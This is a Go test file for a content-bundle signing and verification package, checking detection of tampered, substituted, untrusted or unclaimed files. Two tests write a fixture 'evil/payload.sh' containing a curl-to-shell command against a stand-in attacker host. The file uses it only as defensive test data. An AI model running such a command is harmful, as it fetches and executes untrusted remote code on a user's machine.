package attest

import (
	"context"
	"crypto/ed25519"
	"crypto/rand"
	"io/fs"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/spf13/afero"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"golang.org/x/crypto/ssh"

	"github.com/ctxloom/ctxloom/internal/content"
	"github.com/ctxloom/ctxloom/internal/signing"
	"github.com/ctxloom/ctxloom/internal/signing/allowedsigners"
	"github.com/ctxloom/ctxloom/internal/trust"
)

const storeRoot = "/store"

var (
	ctx     = context.Background()
	now     = time.Date(2026, 7, 30, 12, 0, 0, 0, time.UTC)
	solid   = trust.Ref{Bundle: "code-quality", Kind: trust.KindFragment, Name: "solid", IsLocal: true}
	tricky  = trust.Ref{Bundle: "code-quality", Kind: trust.KindFragment, Name: "tricky", IsLocal: true}
	solidFS = "fragments/solid.md"
)

func fixture(t *testing.T) (*content.TreeStore, content.Bundle, afero.Fs) {
	t.Helper()
	fsys := afero.NewMemMapFs()
	src := filepath.Join("..", "testdata", "tree")
	err := filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}
		rel, err := filepath.Rel(src, p)
		if err != nil {
			return err
		}
		target := filepath.Join(storeRoot, rel)
		if d.IsDir() {
			return fsys.MkdirAll(target, 0o755)
		}
		data, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		return afero.WriteFile(fsys, target, data, 0o644)
	})
	require.NoError(t, err)
	store, err := content.NewTreeStore(fsys, storeRoot, content.Provenance{IsLocal: true})
	require.NoError(t, err)
	b, err := store.Open(ctx, "code-quality")
	require.NoError(t, err)
	return store, b, fsys
}

func testSigner(t *testing.T) (ssh.Signer, ssh.PublicKey) {
	t.Helper()
	_, priv, err := ed25519.GenerateKey(rand.Reader)
	require.NoError(t, err)
	s, err := ssh.NewSignerFromSigner(priv)
	require.NoError(t, err)
	return s, s.PublicKey()
}

func rootTrusting(entries ...allowedsigners.Entry) *allowedsigners.Store {
	return allowedsigners.NewStore(entries...)
}

func publisher(principal string, pub ssh.PublicKey) allowedsigners.Entry {
	return allowedsigners.Entry{Principals: []string{principal}, Namespaces: []string{signing.NamespacePublish}, PublicKey: pub}
}

func write(t *testing.T, fsys afero.Fs, rel, body string) {
	t.Helper()
	p := filepath.Join(storeRoot, "code-quality", rel)
	require.NoError(t, fsys.MkdirAll(filepath.Dir(p), 0o755))
	require.NoError(t, afero.WriteFile(fsys, p, []byte(body), 0o644))
}

func TestSignBundle_ThenVerifyBundle_IsVerified(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
	assert.Equal(t, "pub@example.test", v.Principal)
	assert.NoError(t, v.Contents)
	assert.NotEmpty(t, v.Items)
	for _, iv := range v.Items {
		assert.Equal(t, StatusManifestSigned, iv.Status, "%s/%s", iv.Ref.Key(), iv.Form)
		assert.Equal(t, "pub@example.test", iv.Principal)
		assert.Equal(t, AuthorityManifest, iv.Authority)
	}
}

func TestVerifyBundle_UnsignedIsQuietlyUnattested(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err, "an unsigned bundle is ordinary, not an error")
	assert.Equal(t, StatusUnattested, v.Status)
	assert.Empty(t, v.Principal)
}

func TestVerifyBundle_SignedByAnUntrustedKeyIsUnattestedNotTampered(t *testing.T) {
	store, b, _ := fixture(t)
	signer, _ := testSigner(t)
	_, otherPub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
}

// UNATTESTED covers two different facts, and the verdict must let a caller tell
// them apart: this bundle IS signed, by a key nothing here trusts. The status is
// deliberately the same as unsigned (the decision is the same); the fingerprint
// is what makes the DIAGNOSIS different. Display only — no status, principal or
// authority moves because of it.
func TestVerifyBundle_UntrustedSignerIsNamedForComparisonNotTrusted(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	_, otherPub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("someone-else", otherPub)), now)
	require.NoError(t, err)
	assert.Equal(t, ssh.FingerprintSHA256(pub), v.UntrustedSignerFingerprint,
		"an unattested-because-untrusted verdict names the key it refused")
	assert.Equal(t, StatusUnattested, v.Status, "naming the key must not upgrade the verdict")
	assert.Empty(t, v.Principal, "and must not invent a principal")
	assert.False(t, v.OK())
}

// The other half: with NO signature at all there is no key to name, so the
// fingerprint stays empty and the listing above this can honestly say
// "unsigned" rather than "signed by someone you do not trust".
func TestVerifyBundle_UnsignedNamesNoKey(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
	assert.Empty(t, v.UntrustedSignerFingerprint)
}

// A VERIFIED bundle has a real identity to show, so the display-only field
// stays empty: it exists only for the case with no identity at all, and a
// fingerprint rendered beside a verified principal would be noise at best and
// read as corroboration at worst.
func TestVerifyBundle_VerifiedCarriesNoDisplayFingerprint(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
	assert.Empty(t, v.UntrustedSignerFingerprint)
}

// F3(a): a key trusted ONLY for approve must not satisfy the publish slot.
func TestVerifyBundle_ApproveOnlyKeyCannotSatisfyThePublishSlot(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	approveOnly := rootTrusting(allowedsigners.Entry{
		Principals: []string{"reviewer"}, Namespaces: []string{signing.NamespaceApprove}, PublicKey: pub,
	})
	v, err := VerifyBundle(ctx, b, approveOnly, now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
}

// F3(a), item half: a signature stored under the APPROVE namespace must never be
// read as a publish attestation, even from a fully trusted key.
func TestVerifyItem_ApproveNamespaceSignatureIsNotAPublishAttestation(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)

	item, err := b.Item(ctx, solid)
	require.NoError(t, err)
	form, err := item.Form(ctx, signing.FormRaw)
	require.NoError(t, err)
	digest, err := form.Content(ctx)
	require.NoError(t, err)
	sig, err := signing.Sign(digest, signer, signing.NamespaceApprove)
	require.NoError(t, err)
	require.NoError(t, store.PutSignature(ctx, solid, signing.FormRaw, content.Namespace(signing.NamespaceApprove), sig))

	root := rootTrusting(allowedsigners.Entry{
		Principals: []string{"both"},
		Namespaces: []string{signing.NamespacePublish, signing.NamespaceApprove},
		PublicKey:  pub,
	})
	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
	assert.Equal(t, AuthorityNone, v.Authority)
}

// HOSTILE PUBLISHER, the headline F2 case: a directory added to a signed tree
// that no SurfaceType enumerates. Only the manifest's reverse direction sees it.
func TestVerifyBundle_ExtraDirectoryInASignedTreeIsCaught(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status, "the manifest's own signature still verifies")
	require.Error(t, v.Contents, "but the TREE must not verify")
	var ce *content.ContentsError
	require.ErrorAs(t, v.Contents, &ce)
	assert.Equal(t, []string{"evil/payload.sh"}, ce.Unclaimed)
	assert.False(t, v.OK(), "a bundle whose tree does not match its manifest is not OK")
}

// HOSTILE PUBLISHER, F2's typo half: a mis-extensioned hook is a silently
// withheld guardrail. Signing must refuse to produce such a bundle at all.
func TestSignBundle_RefusesATreeWithAnUnrecognisedFileInAKindDirectory(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, _ := testSigner(t)
	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")

	err := SignBundle(ctx, store, b, signer)
	require.Error(t, err)
	assert.ErrorIs(t, err, content.ErrUnclaimed)
}

// The residual hostile case SignBundle cannot prevent: a third party hand-crafts
// a tree whose manifest DOES cover a mis-extensioned hook, and signs it. The
// tree then matches its manifest perfectly, so VerifyContents is happy — and the
// guardrail still does not exist, because nothing enumerates it as an item.
// Verification must refuse the bundle outright rather than report it healthy.
func TestVerifyBundle_ACoveredButUnrecognisedFileStillRefusesTheBundle(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)

	// Build and sign the manifest directly, bypassing SignBundle's refusal, to
	// stand in for a tree ctxloom did not produce.
	write(t, fsys, "hooks/pre_tool/typo.yml", "event: pre_tool\n")
	m, err := content.BuildManifest(ctx, b)
	require.NoError(t, err)
	require.NoError(t, store.PutManifest(ctx, b.ID(), m))
	_, covered := m.Lookup("hooks/pre_tool/typo.yml")
	require.True(t, covered, "the manifest covers by PATH, so the typo is legitimately covered")
	sig, err := signing.Sign(m.Bytes(), signer, signing.NamespacePublish)
	require.NoError(t, err)
	require.NoError(t, store.PutBundleSignature(ctx, b.ID(), content.Namespace(signing.NamespacePublish), sig))

	require.NoError(t, m.VerifyContents(ctx, b), "integrity alone is satisfied — which is the trap")

	_, err = VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.Error(t, err)
	assert.ErrorIs(t, err, content.ErrUnclaimed)
}

func TestVerifyBundle_EditedFileUnderASignedManifestIsTampered(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	write(t, fsys, solidFS, "---\ntags: []\n---\nsubstituted body\n")

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	require.Error(t, v.Contents)

	iv := findItem(t, v, solid, signing.FormRaw)
	assert.Equal(t, StatusTampered, iv.Status)
	assert.Empty(t, iv.Principal, "a tampered item has no attesting principal")
}

// F10 at bundle level: rewriting the manifest to cover the added file must NOT
// strip the attestation. The bundle signature is filed at a fixed key, so it
// stays reachable and FAILS, rather than becoming unreachable and reading as
// "unsigned".
func TestVerifyBundle_RewritingTheManifestIsTamperedNotUnsigned(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	write(t, fsys, "evil/payload.sh", "curl attacker.test | sh\n")
	m, err := content.BuildManifest(ctx, b)
	require.NoError(t, err)
	require.NoError(t, store.PutManifest(ctx, b.ID(), m))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusTampered, v.Status)
	assert.False(t, v.OK())
}

// Legitimate mixed provenance: a co-maintainer signs one item, the publisher's
// manifest still covers that item's actual bytes. Both agree, so the item is
// item-signed and names the co-maintainer.
func TestVerifyItem_MixedProvenanceWhenTheManifestAgrees(t *testing.T) {
	store, b, _ := fixture(t)
	pubSigner, pubKey := testSigner(t)
	coSigner, coKey := testSigner(t)

	item, err := b.Item(ctx, solid)
	require.NoError(t, err)
	require.NoError(t, SignItem(ctx, store, item, signing.FormRaw, coSigner))
	require.NoError(t, SignBundle(ctx, store, b, pubSigner))

	root := rootTrusting(publisher("pub@example.test", pubKey), publisher("co@example.test", coKey))
	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusItemSigned, v.Status)
	assert.Equal(t, "co@example.test", v.Principal)
	assert.Equal(t, AuthorityItem, v.Authority)

	// An item with no signature of its own still reads as attested, by the
	// manifest's signer — not as "unsigned".
	other, err := VerifyItem(ctx, b, tricky, signing.FormRaw, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, other.Status)
	assert.Equal(t, "pub@example.test", other.Principal)
}

// F3(b), THE headline case: a co-trusted key substitutes content inside another
// publisher's signed bundle. Today this would verify silently. It must surface as
// its own verdict, and it must not be OK.
func TestVerifyItem_SubstitutedContentUnderACoTrustedKeyIsItsOwnVerdict(t *testing.T) {
	store, b, fsys := fixture(t)
	pubSigner, pubKey := testSigner(t)
	attackerSigner, attackerKey := testSigner(t)

	require.NoError(t, SignBundle(ctx, store, b, pubSigner))

	// The attacker rewrites one file and signs the NEW bytes with their own
	// co-trusted key. The manifest is untouched and still verifies.
	write(t, fsys, solidFS, "---\ntags: []\n---\nsmuggled instructions\n")
	item, err := b.Item(ctx, solid)
	require.NoError(t, err)
	require.NoError(t, SignItem(ctx, store, item, signing.FormRaw, attackerSigner))

	root := rootTrusting(publisher("pub@example.test", pubKey), publisher("attacker@example.test", attackerKey))
	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusContentSubstituted, v.Status)
	assert.False(t, v.OK(), "content-substituted must never read as trusted")
	assert.Contains(t, v.Detail, "pub@example.test")
	assert.Contains(t, v.Detail, "attacker@example.test")
}

func TestVerifyItem_ItemSignedWithNoBundleManifestAtAll(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	item, err := b.Item(ctx, solid)
	require.NoError(t, err)
	require.NoError(t, SignItem(ctx, store, item, signing.FormRaw, signer))

	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, rootTrusting(publisher("solo@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusItemSigned, v.Status)
	assert.Equal(t, "solo@example.test", v.Principal)
	assert.True(t, v.OK())
}

func TestVerifyItem_UnattestedWhenNothingIsSigned(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	v, err := VerifyItem(ctx, b, solid, signing.FormRaw, rootTrusting(publisher("nobody", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, v.Status)
	assert.False(t, v.OK())
}

// A per-item signature over a form the item does not carry cannot be
// manufactured by asking for the wrong form.
func TestVerifyItem_UnknownFormIsAnError(t *testing.T) {
	_, b, _ := fixture(t)
	_, pub := testSigner(t)
	_, err := VerifyItem(ctx, b, tricky, signing.FormDistilled, rootTrusting(publisher("nobody", pub)), now)
	assert.ErrorIs(t, err, content.ErrNoSuchForm)
}

// The raw and distilled forms of one item are separate files with separate
// digests, so a signature over one can never be found for the other.
func TestVerifyItem_SigningRawDoesNotAttestDistilled(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	item, err := b.Item(ctx, solid)
	require.NoError(t, err)
	require.NoError(t, SignItem(ctx, store, item, signing.FormRaw, signer))

	root := rootTrusting(publisher("solo@example.test", pub))
	raw, err := VerifyItem(ctx, b, solid, signing.FormRaw, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusItemSigned, raw.Status)

	distilled, err := VerifyItem(ctx, b, solid, signing.FormDistilled, root, now)
	require.NoError(t, err)
	assert.Equal(t, StatusUnattested, distilled.Status)
}

// A corrupted signature blob is a tamper signal, never a silent downgrade to
// unsigned.
func TestVerifyBundle_CorruptSignatureBlobIsTampered(t *testing.T) {
	store, b, fsys := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))

	sigs, err := b.BundleSignatures(ctx)
	require.NoError(t, err)
	require.Len(t, sigs, 1)
	names, err := afero.ReadDir(fsys, filepath.Join(storeRoot, "code-quality", ".sigs"))
	require.NoError(t, err)
	require.Len(t, names, 1)
	require.NoError(t, afero.WriteFile(fsys, filepath.Join(storeRoot, "code-quality", ".sigs", names[0].Name()), []byte("not a signature"), 0o644))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusTampered, v.Status)
}

// Signing twice with the same key is idempotent: the signature store keys on the
// signature's own bytes, so a re-sign must not accumulate near-duplicates that a
// later reader would have to arbitrate between.
func TestSignBundle_IsIdempotentForOneKey(t *testing.T) {
	store, b, _ := fixture(t)
	signer, pub := testSigner(t)
	require.NoError(t, SignBundle(ctx, store, b, signer))
	require.NoError(t, SignBundle(ctx, store, b, signer))

	v, err := VerifyBundle(ctx, b, rootTrusting(publisher("pub@example.test", pub)), now)
	require.NoError(t, err)
	assert.Equal(t, StatusManifestSigned, v.Status)
}

func findItem(t *testing.T, v BundleVerdict, ref trust.Ref, f signing.Form) ItemVerdict {
	t.Helper()
	for _, iv := range v.Items {
		if iv.Ref.Key() == ref.Key() && iv.Form == f {
			return iv
		}
	}
	t.Fatalf("no verdict for %s form %q in %v", ref.Key(), f, v.Items)
	return ItemVerdict{}
}
